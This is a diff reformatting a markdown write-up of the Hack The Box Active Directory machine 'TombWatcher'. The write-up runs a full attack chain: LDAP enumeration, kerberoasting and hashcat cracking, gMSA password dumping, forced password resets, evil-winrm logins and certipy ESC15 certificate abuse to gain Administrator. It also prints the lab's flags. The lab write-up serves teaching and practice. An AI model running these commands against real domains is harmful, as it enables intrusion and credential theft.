@@ -2,8 +2,11 @@
 sticker: emoji//2620-fe0f
 ---
 
-# PORT SCAN
----
+# TOMBWATCHER
+
+## PORT SCAN
+
+***
 
 | PORT      | SERVICE       |
 | --------- | ------------- |
@@ -15,14 +18,14 @@ sticker: emoji//2620-fe0f
 | 389/tcp   | ldap          |
 | 445/tcp   | microsoft-ds? |
 | 464/tcp   | kpasswd5?     |
-| 593/tcp   | ncacn_http    |
+| 593/tcp   | ncacn\_http   |
 | 636/tcp   | ssl/ldap      |
 | 3268/tcp  | ldap          |
 | 3269/tcp  | ssl/ldap      |
 | 5985/tcp  | http          |
 | 9389/tcp  | mc-nmf        |
 | 49666/tcp | msrpc         |
-| 49691/tcp | ncacn_http    |
+| 49691/tcp | ncacn\_http   |
 | 49692/tcp | msrpc         |
 | 49694/tcp | msrpc         |
 | 49712/tcp | msrpc         |
@@ -30,9 +33,9 @@ sticker: emoji//2620-fe0f
 | 49740/tcp | msrpc         |
 | 51522/tcp | msrpc         |
 
+## RECONNAISSANCE
 
-# RECONNAISSANCE
----
+***
 
 As usual on Windows machines for HTB, we receive initial credentials:
 
@@ -206,13 +209,11 @@ Alfred, John, Sam
 
 `Ldapsearch` also works on here, we can do enumeration for this service with:
 
-
 **List all directory objects**:
 
 ```bash
 ldapsearch -x -H ldap://DC01.tombwatcher.htb -D "henry@tombwatcher.htb" -w 'H3nry_987TGV!' -b "dc=tombwatcher,dc=htb" | tee ldap_full.txt
 ```
-
 
 **Find all users and their attributes:**
 
@@ -220,16 +221,13 @@ ldapsearch -x -H ldap://DC01.tombwatcher.htb -D "henry@tombwatcher.htb" -w 'H3nr
 ldapsearch -x -H ldap://DC01.tombwatcher.htb -D "henry@tombwatcher.htb" -w 'H3nry_987TGV!' -b "dc=tombwatcher,dc=htb" "(objectClass=user)" sAMAccountName userPrincipalName description memberOf pwdLastSet | tee ldap_users.txt
 ```
 
-
 **Find privileged groups (Domain Admins, Enterprise Admins):**
 
 ```bash
 ldapsearch -x -H ldap://DC01.tombwatcher.htb -D "henry@tombwatcher.htb" -w 'H3nry_987TGV!' -b "dc=tombwatcher,dc=htb" "(&(objectClass=group)(|(cn=Domain Admins)(cn=Enterprise Admins)))" member | tee ldap_admins.txt
 ```
 
-
 On the ldapsearch scan, we can find this for `Alfred`:
-
 
 ```bash
 # Alfred, Users, tombwatcher.htb
@@ -284,7 +282,6 @@ Nice, we already know an exploitation path, let's use bloodhound to finish our e
 bloodhound-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -ns 10.10.11.72 -c All --zip
 ```
 
-
 As an usual recommendation:
 
 > Note: If you want to flush all previous data from bloodhound, you can go to `http://localhost:7474` and perform the following query:
@@ -294,42 +291,35 @@ MATCH (n)
 DETACH DELETE n
 ```
 
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615225510.png) First of all and how I explained it earlier, we can perform a kerberoast attack on `Alfred`,
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615225510.png)
-First of all and how I explained it earlier, we can perform a kerberoast attack on `Alfred`, 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615225549.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615225549.png)
 
 For more info on this attack, refer to:
 
 Kerberoast: https://notes.benheater.com/books/active-directory/page/kerberoasting
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615225921.png)
-We can add ourselves as `alfred` to `infrastructure`:
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615225921.png) We can add ourselves as `alfred` to `infrastructure`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615225950.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615225950.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615230018.png)
-We got `ReadGMSAPassword` over `Ansible_devs`:
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615230018.png) We got `ReadGMSAPassword` over `Ansible_devs`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615230202.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615230202.png)
 
 We can exploit that path to force the password change for `sam` user:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615230230.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615230230.png)
 
-This user has `WriteOwner` over `John`, and if we check `John`, we can find this: 
+This user has `WriteOwner` over `John`, and if we check `John`, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615230726.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615230726.png)
 
 We got `GenericAll` over `ADCS` which means we may able to get a certificate to leverage admin access, let's proceed to exploitation to check our exploitation path.
 
+## EXPLOITATION
 
-
-# EXPLOITATION
----
-
+***
 
 ```mermaid
 graph TD
@@ -357,7 +347,7 @@ graph TD
     class K,L,M,N,O success
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615231654.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615231654.png)
 
 We must begin from the bottom, first in our diagram is to perform the `kerberoast` attack, let's do it:
 
@@ -380,7 +370,6 @@ $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$13c4d291aac1cd75d8aa
 ```
 
 We got our `TGS`, let's crack it using hashcat:
-
 
 ```
 hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
@@ -406,7 +395,6 @@ bloodyAD -d tombwatcher.htb -u alfred -p basketball --host 10.10.11.72 add group
 Nice, now next step is to read `GMSAPassword`, we can use `gMSADumper.py`:
 
 REPO: https://github.com/micahvandeusen/gMSADumper
-
 
 ```python
 python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
@@ -454,14 +442,13 @@ Nice, let's go into evil-winrm:
 evil-winrm -i dc01.tombwatcher.htb -u john -p 'P@ssw0rd123!'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250615234025.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250615234025.png)
 
 We can now begin privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 We already got access as John, if we remember our diagram, we got `GenericAll` over `ADCS`, the admin path must be with certificate exploitation, first let's use `certipy` to check all certificates:
 
@@ -614,7 +601,7 @@ certipy find -u cert_admin -p 'cert_ADMIN!123@' -dc-ip 10.10.11.72
 [*] Wrote JSON output to '20250616045513_Certipy.json'
 ```
 
-On template `17` which corresponds to webserver, we can find this: 
+On template `17` which corresponds to webserver, we can find this:
 
 ```json
  17
@@ -664,12 +651,11 @@ As we can notice, we find `ESC15`, on internet we can find info on how to exploi
 
 ESC15: https://medium.com/@offsecdeer/adcs-exploitation-series-part-2-certificate-mapping-esc15-6e19a6037760
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250616000743.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250616000743.png)
 
 Let's recreate the PoC:
 
-```PYTHON
+```python
 certipy req -u 'cert_admin@tombwatcher.htb' -p 'cert_ADMIN!123@' -target dc01.tombwatcher.htb -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'Administrator' -application-policies 'Client Authentication'
 
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
@@ -706,7 +692,7 @@ Password changed successfully!
 
 Nice, we can finally use `evil-winrm` to get into admin:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250616001107.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250616001107.png)
 
 Let's get our flags and finish the CTF:
 
@@ -718,7 +704,4 @@ Let's get our flags and finish the CTF:
 44bd5ef7584300a8feffe70567ec01e9
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250616001257.png)
-
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250616001257.png)
